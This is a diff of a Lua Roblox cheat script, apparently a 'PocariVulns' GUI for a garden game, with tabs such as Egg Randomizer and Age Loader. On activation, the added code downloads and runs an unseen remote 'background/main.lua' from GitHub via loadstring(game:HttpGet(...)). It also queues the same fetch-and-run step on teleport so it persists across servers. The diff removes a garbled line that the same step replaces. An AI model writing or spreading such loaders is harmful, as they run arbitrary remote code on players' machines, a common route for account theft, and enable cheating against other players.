@@ -12,7 +12,6 @@ local function logError(err)
 end
 
 local success, err = xpcall(function()
-    local SCRIPT_URL = "https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/pocarivulns.lua"
     local Activate = _G.PocariVulnsActivated or false
 
     local player = Players.LocalPlayer
@@ -240,7 +239,6 @@ local success, err = xpcall(function()
             enabled = enabledByDefault
         }
         
-        -- Set initial state for non-Main tabs
         if name ~= "Main" and not enabledByDefault and not Activate then
             nameLabel.TextColor3 = Color3.fromRGB(80, 85, 100)
             tabStroke.Color = Color3.fromRGB(30, 35, 50)
@@ -271,15 +269,12 @@ local success, err = xpcall(function()
         return tab
     end
 
-    -- Create tabs (Main is always enabled, others are disabled until activation)
-    createTab("Main", 1, true) -- Enabled by default
+    createTab("Main", 1, true)
     createTab("Egg Randomizer", 2, false)
     createTab("Mutation Finder", 3, false)
     createTab("Age Loader", 4, false)
-    createTab("Button 5", 5, false)
-    createTab("Coming Soon", 6, false) -- Always disabled
+    createTab("Coming Soon", 5, false)
 
-    -- Set Coming Soon tab to always be disabled
     tabs["Coming Soon"].enabled = false
     tabs["Coming Soon"].label.TextColor3 = Color3.fromRGB(80, 85, 100)
     tabs["Coming Soon"].stroke.Color = Color3.fromRGB(30, 35, 50)
@@ -640,7 +635,6 @@ local success, err = xpcall(function()
             Activate = true
             _G.PocariVulnsActivated = true
             
-            -- Enable all tabs except "Coming Soon"
             for name, tab in pairs(tabs) do
                 if name ~= "Main" and name ~= "Coming Soon" then
                     tab.enabled = true
@@ -649,19 +643,24 @@ local success, err = xpcall(function()
                 end
             end
             
-            if SCRIPT_URL then
-                loadstring(game httpget("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
-                local teleportScript = string.format([[
-                    _G.PocariVulnsActivated = true
-                    loadstring(game:HttpGet("%s", true))()
-                ]], SCRIPT_URL)
-                
-                if queue_on_teleport then
-                    queue_on_teleport(teleportScript)
-                end
-                if syn and syn.queue_on_teleport then
-                    syn.queue_on_teleport(teleportScript)
-                end
+            local success, err = pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
+            end)
+            
+            if not success then
+                warn("Error loading script: " .. err)
+            end
+            
+            local teleportScript = [[
+                _G.PocariVulnsActivated = true
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
+            ]]
+            
+            if queue_on_teleport then
+                queue_on_teleport(teleportScript)
+            end
+            if syn and syn.queue_on_teleport then
+                syn.queue_on_teleport(teleportScript)
             end
             
             welcomeLabel.Text = "Activated! Please select a script from the sidebar."
@@ -1103,36 +1102,10 @@ local success, err = xpcall(function()
         return content
     end
 
-    local function createPlaceholderTabContent(name)
-        local content = Instance.new("Frame")
-        content.Name = name .. "Content"
-        content.Size = UDim2.new(1, 0, 0, 0)
-        content.AutomaticSize = Enum.AutomaticSize.Y
-        content.BackgroundTransparency = 1
-        content.Visible = false
-        content.Parent = contentInner
-        
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1, -40, 0, 200)
-        label.Position = UDim2.new(0, 20, 0, 20)
-        label.BackgroundTransparency = 1
-        label.Text = "Content for " .. name .. " will appear here"
-        label.TextColor3 = Color3.fromRGB(180, 185, 230)
-        label.TextSize = 12
-        label.Font = Enum.Font.GothamSemibold
-        label.TextWrapped = true
-        label.TextXAlignment = Enum.TextXAlignment.Center
-        label.TextYAlignment = Enum.TextYAlignment.Center
-        label.Parent = content
-        
-        return content
-    end
-
     tabContents["Main"] = createMainTabContent()
     tabContents["Egg Randomizer"] = createEggRandomizerContent()
     tabContents["Mutation Finder"] = createMutationFinderContent()
     tabContents["Age Loader"] = createAgeLoaderContent()
-    tabContents["Button 5"] = createPlaceholderTabContent("Button 5")
 
     tabContents["Main"].Visible = true
     for name, content in pairs(tabContents) do
